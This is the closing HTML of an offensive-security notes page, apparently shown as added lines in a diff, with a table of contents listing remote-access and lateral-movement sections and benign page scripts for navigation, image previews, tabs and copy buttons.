+</ul></div><nav class="notes-related" aria-label="Related notes"><strong>Related notes</strong><ul><li><a href="/en/notes/windows-file-transfers/"><span>Offensive Security / File Transfer</span>Windows File Transfers</a></li><li><a href="/en/notes/linux-file-transfers/"><span>Offensive Security / File Transfer</span>Linux File Transfers</a></li></ul></nav></article><aside class="notes-toc" aria-label="On this page"><strong>On this page</strong><ul><li data-depth="2"><a href="#quick-reference">Quick reference</a></li><li data-depth="2"><a href="#authentication-material">Authentication material</a></li><li data-depth="3"><a href="#local-and-domain-accounts">Local and domain accounts</a></li><li data-depth="3"><a href="#passwords">Passwords</a></li><li data-depth="3"><a href="#nt-hashes">NT hashes</a></li><li data-depth="3"><a href="#kerberos-tickets-and-caches">Kerberos tickets and caches</a></li><li data-depth="4"><a href="#getting-a-tgt-from-linux">Getting a TGT from Linux</a></li><li data-depth="4"><a href="#realm-dns-spn-and-time">Realm, DNS, SPN, and time</a></li><li data-depth="3"><a href="#ssh-keys-and-certificates">SSH keys and certificates</a></li><li data-depth="3"><a href="#x509-certificates">X.509 certificates</a></li><li data-depth="2"><a href="#ssh">SSH</a></li><li data-depth="3"><a href="#password">Password</a></li><li data-depth="3"><a href="#private-key">Private key</a></li><li data-depth="3"><a href="#running-a-command">Running a command</a></li><li data-depth="3"><a href="#adding-a-temporary-key">Adding a temporary key</a></li><li data-depth="3"><a href="#jump-hosts">Jump hosts</a></li><li data-depth="2"><a href="#rdp">RDP</a></li><li data-depth="3"><a href="#password-and-windows-credentials">Password and Windows credentials</a></li><li data-depth="3"><a href="#nt-hash-and-restricted-admin">NT hash and Restricted Admin</a></li><li data-depth="3"><a href="#kerberos">Kerberos</a></li><li data-depth="2"><a href="#winrm-and-powershell-remoting">WinRM and PowerShell Remoting</a></li><li data-depth="3"><a href="#powershell-from-windows">PowerShell from Windows</a></li><li data-depth="3"><a href="#winrs">WinRS</a></li><li data-depth="3"><a href="#evil-winrm">Evil-WinRM</a></li><li data-depth="3"><a href="#netexec">NetExec</a></li><li data-depth="3"><a href="#client-certificate">Client certificate</a></li><li data-depth="3"><a href="#second-hop">Second hop</a></li><li data-depth="2"><a href="#smb-and-service-control-manager">SMB and Service Control Manager</a></li><li data-depth="3"><a href="#psexec">PsExec</a></li><li data-depth="3"><a href="#smbexec">SMBExec</a></li><li data-depth="3"><a href="#netexec-1">NetExec</a></li><li data-depth="2"><a href="#wmi-and-cim">WMI and CIM</a></li><li data-depth="3"><a href="#impacket-wmiexec">Impacket WMIExec</a></li><li data-depth="3"><a href="#netexec-wmi">NetExec WMI</a></li><li data-depth="3"><a href="#cim-over-ws-man">CIM over WS-Man</a></li><li data-depth="3"><a href="#cim-over-dcom">CIM over DCOM</a></li><li data-depth="3"><a href="#legacy-wmic">Legacy WMIC</a></li><li data-depth="2"><a href="#scheduled-tasks">Scheduled Tasks</a></li><li data-depth="3"><a href="#impacket-atexec">Impacket atexec</a></li><li data-depth="3"><a href="#schtasks">schtasks</a></li><li data-depth="2"><a href="#troubleshooting">Troubleshooting</a></li><li data-depth="3"><a href="#authentication-and-authorization">Authentication and authorization</a></li><li data-depth="3"><a href="#kerberos-1">Kerberos</a></li><li data-depth="3"><a href="#switching-mechanisms">Switching mechanisms</a></li><li data-depth="2"><a href="#references">References</a></li></ul></aside></div></div></div><script>
+    (() => {
+      const root = document.querySelector('.notes-page');
+      if (!root) return;
+      const tocLinks = [...root.querySelectorAll('.notes-toc a')];
+      const targets = tocLinks.map((link) => document.getElementById(decodeURIComponent(link.hash.slice(1)))).filter(Boolean);
+      const markCurrent = (link, active) => active ? link.setAttribute('aria-current', 'location') : link.removeAttribute('aria-current');
+      tocLinks.forEach((selected) => selected.addEventListener('click', () => tocLinks.forEach((link) => markCurrent(link, link === selected))));
+      if (targets.length) {
+        const updateActiveHeading = () => {
+          const active = targets.reduce((current, target) => target.getBoundingClientRect().top <= 150 ? target : current, targets[0]);
+          tocLinks.forEach((link) => markCurrent(link, link.hash === `#${active.id}`));
+        };
+        updateActiveHeading();
+        window.addEventListener('scroll', updateActiveHeading, { passive:true });
+      }
+    })();
+  </script></main><footer class="site-footer"><div class="footer-inner"><a class="footer-wordmark" href="/en/">dful<span>.</span></a><span>Offensive Security · AI Security · Agentic Systems</span></div></footer><script>
+  (() => {
+    const init = () => {
+      const figures = [...document.querySelectorAll('.publishing-prose .pub-figure[data-preview="true"]')];
+      if (!figures.length) return;
+
+      const spanish = document.documentElement.lang === 'es';
+      const labels = spanish
+        ? {
+            open: 'Abrir vista ampliada',
+            close: 'Cerrar vista previa',
+            zoom: 'Zoom de imagen',
+            fit: 'Ajustar',
+            actual: 'Tamaño real',
+          }
+        : {
+            open: 'Open enlarged preview',
+            close: 'Close preview',
+            zoom: 'Image zoom',
+            fit: 'Fit',
+            actual: 'Actual size',
+          };
+
+      let dialog = document.querySelector('dialog[data-figure-preview]');
+      if (!(dialog instanceof HTMLDialogElement)) {
+        dialog = document.createElement('dialog');
+        dialog.className = 'figure-preview-dialog';
+        dialog.setAttribute('data-figure-preview', 'true');
+        dialog.dataset.mode = 'fit';
+
+        const toolbar = document.createElement('div');
+        toolbar.className = 'figure-preview-toolbar';
+
+        const modeGroup = document.createElement('div');
+        modeGroup.className = 'figure-preview-modes';
+        modeGroup.setAttribute('role', 'group');
+        modeGroup.setAttribute('aria-label', labels.zoom);
+
+        const fit = document.createElement('button');
+        fit.type = 'button';
+        fit.className = 'figure-preview-mode';
+        fit.setAttribute('data-figure-preview-fit', 'true');
+        fit.setAttribute('aria-pressed', 'true');
+        fit.textContent = labels.fit;
+
+        const actual = document.createElement('button');
+        actual.type = 'button';
+        actual.className = 'figure-preview-mode';
+        actual.setAttribute('data-figure-preview-actual', 'true');
+        actual.setAttribute('aria-pressed', 'false');
+        actual.setAttribute('title', labels.actual);
+        actual.textContent = '1:1';
+
+        const close = document.createElement('button');
+        close.type = 'button';
+        close.className = 'figure-preview-close';
+        close.setAttribute('data-figure-preview-close', 'true');
+        close.setAttribute('aria-label', labels.close);
+        close.textContent = '×';
+
+        const viewport = document.createElement('div');
+        viewport.className = 'figure-preview-viewport';
+        viewport.setAttribute('data-figure-preview-viewport', 'true');
+
+        const image = document.createElement('img');
+        image.className = 'figure-preview-image';
+        viewport.appendChild(image);
+
+        const caption = document.createElement('p');
+        caption.className = 'figure-preview-caption';
+        caption.id = 'figure-preview-caption';
+
+        modeGroup.append(fit, actual);
+        toolbar.append(modeGroup, close);
+        dialog.append(toolbar, viewport, caption);
+        document.body.appendChild(dialog);
+
+        const setMode = (mode) => {
+          const native = mode === 'native';
+          dialog.dataset.mode = native ? 'native' : 'fit';
+          fit.setAttribute('aria-pressed', native ? 'false' : 'true');
+          actual.setAttribute('aria-pressed', native ? 'true' : 'false');
+          if (!native) viewport.scrollTo({ top: 0, left: 0 });
+        };
+
+        fit.addEventListener('click', () => setMode('fit'));
+        actual.addEventListener('click', () => setMode('native'));
+        close.addEventListener('click', () => dialog.close());
+        dialog.addEventListener('click', (event) => {
+          if (event.target !== dialog) return;
+          const rect = dialog.getBoundingClientRect();
+          const outside = event.clientX < rect.left || event.clientX > rect.right || event.clientY < rect.top || event.clientY > rect.bottom;
+          if (outside) dialog.close();
+        });
+        dialog.addEventListener('close', () => {
+          setMode('fit');
+          const trigger = dialog.dataset.lastTrigger;
+          const source = trigger ? document.querySelector(`[data-preview-trigger="${trigger}"]`) : null;
+          if (source instanceof HTMLButtonElement) source.focus();
+          delete dialog.dataset.lastTrigger;
+        });
+      }
+
+      const close = dialog.querySelector('[data-figure-preview-close]');
+      const fit = dialog.querySelector('[data-figure-preview-fit]');
+      const actual = dialog.querySelector('[data-figure-preview-actual]');
+      const previewImage = dialog.querySelector('.figure-preview-image');
+      const viewport = dialog.querySelector('[data-figure-preview-viewport]');
+      const caption = dialog.querySelector('.figure-preview-caption');
+      if (!(close instanceof HTMLButtonElement) || !(fit instanceof HTMLButtonElement) || !(actual instanceof HTMLButtonElement) || !(previewImage instanceof HTMLImageElement) || !(viewport instanceof HTMLDivElement) || !(caption instanceof HTMLParagraphElement)) return;
+
+      const largestSource = (image) => {
+        const candidates = (image.srcset || '')
+          .split(',')
+          .map((candidate) => candidate.trim())
+          .filter(Boolean)
+          .map((candidate) => {
+            const parts = candidate.split(/\s+/);
+            const descriptor = parts.length > 1 ? parts.pop() : '';
+            const url = parts.join(' ') || candidate;
+            let score = 0;
+            if (descriptor.endsWith('w')) score = Number.parseFloat(descriptor);
+            else if (descriptor.endsWith('x')) score = Number.parseFloat(descriptor) * (image.naturalWidth || 1);
+            return { url, score: Number.isFinite(score) ? score : 0 };
+          })
+          .sort((a, b) => b.score - a.score);
+        return candidates[0]?.url || image.currentSrc || image.src;
+      };
+
+      figures.forEach((figure, index) => {
+        const image = figure.querySelector('img');
+        if (!(image instanceof HTMLImageElement) || figure.querySelector('[data-preview-trigger]')) return;
+
+        const trigger = document.createElement('button');
+        trigger.type = 'button';
+        trigger.className = 'figure-preview-trigger';
+        const triggerId = `figure-preview-trigger-${index + 1}`;
+        trigger.setAttribute('data-preview-trigger', triggerId);
+        const alt = image.alt || (spanish ? 'Imagen técnica' : 'Technical image');
+        trigger.setAttribute('aria-label', `${labels.open}: ${alt}`);
+        image.parentNode?.insertBefore(trigger, image);
+        trigger.appendChild(image);
+
+        trigger.addEventListener('click', () => {
+          previewImage.src = largestSource(image);
+          previewImage.alt = alt;
+          const figureCaption = figure.querySelector('figcaption')?.textContent?.trim() || alt;
+          caption.textContent = figureCaption;
+          dialog.setAttribute('aria-label', alt);
+          dialog.setAttribute('aria-describedby', caption.id);
+          dialog.dataset.lastTrigger = triggerId;
+          dialog.dataset.mode = 'fit';
+          fit.setAttribute('aria-pressed', 'true');
+          actual.setAttribute('aria-pressed', 'false');
+          viewport.scrollTo({ top: 0, left: 0 });
+
+          if (typeof dialog.showModal === 'function') {
+            dialog.showModal();
+            close.focus();
+          }
+        });
+      });
+    };
+
+    init();
+    document.addEventListener('astro:page-load', init);
+  })();
+</script><script type="module">var e=()=>{document.querySelectorAll(`.pub-tabs:not([data-enhanced])`).forEach((e,t)=>{e.setAttribute(`data-enhanced`,`true`);let n=[...e.querySelectorAll(`:scope > .pub-tab`)];if(!n.length)return;let r=document.createElement(`div`);r.className=`pub-tab-list`,r.setAttribute(`role`,`tablist`),n.forEach((e,i)=>{let a=`pub-tab-${t}-${i}`,o=`pub-tab-panel-${t}-${i}`,s=document.createElement(`button`);s.type=`button`,s.id=a,s.className=`pub-tab-button`,s.setAttribute(`role`,`tab`),s.setAttribute(`aria-controls`,o),s.setAttribute(`aria-selected`,i===0?`true`:`false`),s.tabIndex=i===0?0:-1,s.textContent=e.getAttribute(`data-tab-label`)||`Tab ${i+1}`,e.id=o,e.setAttribute(`role`,`tabpanel`),e.setAttribute(`aria-labelledby`,a),e.toggleAttribute(`hidden`,i!==0),s.addEventListener(`click`,()=>{[...r.querySelectorAll(`[role="tab"]`)].forEach(e=>{e.setAttribute(`aria-selected`,e===s?`true`:`false`),e.tabIndex=e===s?0:-1}),n.forEach(t=>t.toggleAttribute(`hidden`,t!==e)),s.focus()}),s.addEventListener(`keydown`,e=>{let t=[...r.querySelectorAll(`[role="tab"]`)],n=t.indexOf(s),i=n;if(e.key===`ArrowRight`)i=(n+1)%t.length;else if(e.key===`ArrowLeft`)i=(n-1+t.length)%t.length;else if(e.key===`Home`)i=0;else if(e.key===`End`)i=t.length-1;else return;e.preventDefault(),t[i].click()}),r.appendChild(s)}),e.prepend(r)})};e(),document.addEventListener(`astro:page-load`,e);</script><script type="module">var e=()=>{let e=document.documentElement.lang===`es`?{copy:`Copiar`,copied:`Copiado`}:{copy:`Copy`,copied:`Copied`};document.querySelectorAll(`pre`).forEach(t=>{if(t.closest(`.pub-filetree`)||t.parentElement?.classList.contains(`code-frame`))return;let n=document.createElement(`div`);n.className=`code-frame`,t.parentNode?.insertBefore(n,t),n.appendChild(t);let r=t.dataset.language??t.querySelector(`code`)?.className.match(/language-([\w-]+)/)?.[1];if(r){let e=document.createElement(`span`);e.className=`code-language`,e.textContent=r===`powershell`?`PowerShell`:r,n.appendChild(e)}let i=document.createElement(`button`);i.className=`copy-code`,i.type=`button`,i.textContent=e.copy,i.addEventListener(`click`,async()=>{try{await navigator.clipboard.writeText(t.textContent??``),i.textContent=e.copied,window.setTimeout(()=>{i.textContent=e.copy},1400)}catch{i.textContent=e.copy}}),n.appendChild(i)})};e(),document.addEventListener(`astro:page-load`,e);</script></body></html>
